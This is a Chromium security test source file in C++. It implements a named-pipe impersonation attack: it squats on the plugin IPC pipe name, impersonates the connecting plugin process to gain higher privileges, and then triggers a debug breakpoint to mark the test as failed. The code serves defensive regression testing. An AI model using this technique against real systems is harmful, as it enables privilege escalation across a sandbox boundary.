// Copyright (c) 2006-2008 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include <windows.h>
#include <string>
#include <sstream>

#include "chrome/test/security_tests/ipc_security_tests.h"

namespace {

// Debug output messages prefix.
const char kODSMgPrefix[] = "[security] ";
// Format of the Chrome browser pipe for plugins.
const wchar_t kChromePluginPipeFmt[] = L"\\\\.\\pipe\\chrome.%ls.p%d";
// Size for the in/out pipe buffers.
const int kBufferSize = 1024;

// Define the next symbol if you want to have tracing of errors.
#ifdef PIPE_SECURITY_DBG
// Generic debug output function.
void ODSMessageGLE(const char* txt) {
  DWORD gle = ::GetLastError();
  std::ostringstream oss;
  oss << kODSMgPrefix << txt << " 0x" << std::hex << gle;
  ::OutputDebugStringA(oss.str().c_str());
}
#else
void ODSMessageGLE(const char* txt) {
}
#endif

// Retrieves the renderer pipe name from the command line. Returns true if the
// name was found.
bool PipeNameFromCommandLine(std::wstring* pipe_name) {
  std::wstring cl(::GetCommandLineW());
  const wchar_t key_name[] = L"--channel";
  std::wstring::size_type pos = cl.find(key_name, 0);
  if (std::wstring::npos == pos) {
    return false;
  }
  pos = cl.find(L"=", pos);
  if (std::wstring::npos == pos) {
    return false;
  }
  ++pos;
  size_t dst = cl.length() - pos;
  if (dst <4) {
    return false;
  }
  for (; dst != 0; --dst) {
    if (!isspace(cl[pos])) {
      break;
    }
    ++pos;
  }
  if (0 == dst) {
    return false;
  }
  std::wstring::size_type pos2 = pos;
  for (; dst != 0; --dst) {
    if (isspace(cl[pos2])) {
      break;
    }
    ++pos2;
  }
  *pipe_name = cl.substr(pos, pos2);
  return true;
}

// Extracts the browser process id and the channel id given the renderer
// pipe name.
bool InfoFromPipeName(const std::wstring& pipe_name, std::wstring* parent_id,
                      std::wstring* channel_id) {
  std::wstring::size_type pos = pipe_name.find(L".", 0);
  if (std::wstring::npos == pos) {
    return false;
  }
  *parent_id = pipe_name.substr(0, pos);
  *channel_id = pipe_name.substr(pos + 1);
  return true;
}

// Creates a server pipe, in byte mode.
HANDLE MakeServerPipeBase(const wchar_t* pipe_name) {
  HANDLE pipe = ::CreateNamedPipeW(pipe_name, PIPE_ACCESS_DUPLEX,
                                   PIPE_TYPE_BYTE | PIPE_READMODE_BYTE, 3,
                                   kBufferSize, kBufferSize, 5000, NULL);
  if (INVALID_HANDLE_VALUE == pipe) {
    ODSMessageGLE("pipe creation failed");
  }
  return pipe;
}

// Creates a chrome plugin server pipe.
HANDLE MakeServerPluginPipe(const std::wstring& prefix, int channel) {
  wchar_t pipe_name[MAX_PATH];
  swprintf_s(pipe_name, kChromePluginPipeFmt, prefix.c_str(), channel);
  return MakeServerPipeBase(pipe_name);
}

struct Context {
  HANDLE pipe;
  Context(HANDLE arg_pipe) : pipe(arg_pipe) {
  }
};

// This function is called from a thread that has a security context that is
// higher than the renderer security context. This can be the plugin security
// context or the browser security context.
void DoEvilThings(Context* context) {
  // To make the test fail we simply trigger a breakpoint in the renderer.
  ::DisconnectNamedPipe(context->pipe);
  __debugbreak();
}

// This is a pipe server thread routine.
DWORD WINAPI PipeServerProc(void* thread_param) {
  if (NULL == thread_param) {
    return 0;
  }
  Context* context = static_cast<Context*>(thread_param);
  HANDLE server_pipe = context->pipe;

  char buffer[4];
  DWORD bytes_read = 0;

  for (;;) {
    // The next call blocks until a connection is made.
    if (!::ConnectNamedPipe(server_pipe, NULL)) {
      if (GetLastError() != ERROR_PIPE_CONNECTED) {
        ODSMessageGLE("== connect named pipe failed ==");
        continue;
      }
    }
    // return value of ReadFile is unimportant.
    ::ReadFile(server_pipe, buffer, 1, &bytes_read, NULL);
    if (::ImpersonateNamedPipeClient(server_pipe)) {
      ODSMessageGLE("impersonation obtained");
      DoEvilThings(context);
      break;
    } else {
      ODSMessageGLE("impersonation failed");
    }
    ::DisconnectNamedPipe(server_pipe);
  }
  delete context;
  return 0;
}
}   // namespace

// Implements a pipe impersonation attack resulting on a privilege elevation on
// the chrome pipe-based IPC.
// When a web-page that has a plug-in is loaded, chrome will do the following
// steps:
//   1) Creates a server pipe with name 'chrome.<pid>.p<n>'. Initially n = 1.
//   2) Launches chrome with command line --type=plugin --channel=<pid>.p<n>
//   3) The new (plugin) process connects to the pipe and sends a 'hello'
//      message.
// The attack creates another server pipe with the same name before step one
// so when the plugin connects it connects to the renderer instead. Once the
// connection is acepted and at least a byte is read from the pipe, the
// renderer can impersonate the plugin process which has a more relaxed
// security context (privilege elevation).
//
// Note that the attack can also be peformed after step 1. In this case we need
// another thread which used to connect to the existing server pipe so the
// plugin does not connect to chrome but to our pipe.
bool PipeImpersonationAttack() {
  std::wstring pipe_name;
  if (!PipeNameFromCommandLine(&pipe_name)) {
    return false;
  }
  std::wstring parent_id;
  std::wstring channel_id;
  if (!InfoFromPipeName(pipe_name, &parent_id, &channel_id)) {
    return false;
  }
  HANDLE plugin_pipe = MakeServerPluginPipe(parent_id, 1);
  if (INVALID_HANDLE_VALUE == plugin_pipe) {
    return true;
  }

  HANDLE thread = ::CreateThread(NULL, 0, PipeServerProc,
                                 new Context(plugin_pipe), 0, NULL);
  if (NULL == thread) {
    return false;
  }
  ::CloseHandle(thread);
  return true;
}
